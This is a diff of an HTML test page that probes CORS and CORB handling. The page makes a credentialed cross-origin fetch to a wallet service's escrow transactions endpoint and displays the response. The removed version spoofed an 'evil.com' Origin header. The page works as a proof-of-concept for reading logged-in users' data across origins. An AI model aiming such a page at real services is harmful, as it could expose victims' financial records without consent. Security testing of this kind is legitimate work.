@@ -1,20 +1,35 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <script>
-      fetch("https://walletbot.me/scwapi/escrow/transactions/", {
-        credentials: "include",
-        mode: "cors",
-        headers: {
-          "Origin": "https://evil.com"
-        }
-      })
-      .then(res => res.text())
-      .then(data => {
-        console.log("Fetched:", data);
-        document.write("<pre>" + data + "</pre>");
-      })
-      .catch(err => console.error("Fetch failed:", err));
-    </script>
-  </body>
+<head>
+  <title>CORS & CORB Test</title>
+</head>
+<body>
+  <h2>Testing fetch from https://walletbot.me</h2>
+  <pre id="output">Running...</pre>
+
+  <script>
+    const output = document.getElementById("output");
+
+    fetch("https://walletbot.me/scwapi/escrow/transactions/", {
+      credentials: "include",  // sends cookies if allowed
+      mode: "cors",            // required for cross-origin requests that return readable responses
+      headers: {
+        "Accept": "application/json"
+        // ⚠️ DO NOT set Origin manually — browser overrides it anyway
+      }
+    })
+    .then(res => {
+      output.textContent = `Status: ${res.status}\nContent-Type: ${res.headers.get("content-type")}`;
+
+      // Try to read content
+      return res.text();
+    })
+    .then(data => {
+      output.textContent += `\n\nResponse:\n${data}`;
+    })
+    .catch(err => {
+      output.textContent = "Fetch failed:\n" + err;
+    });
+  </script>
+</body>
 </html>
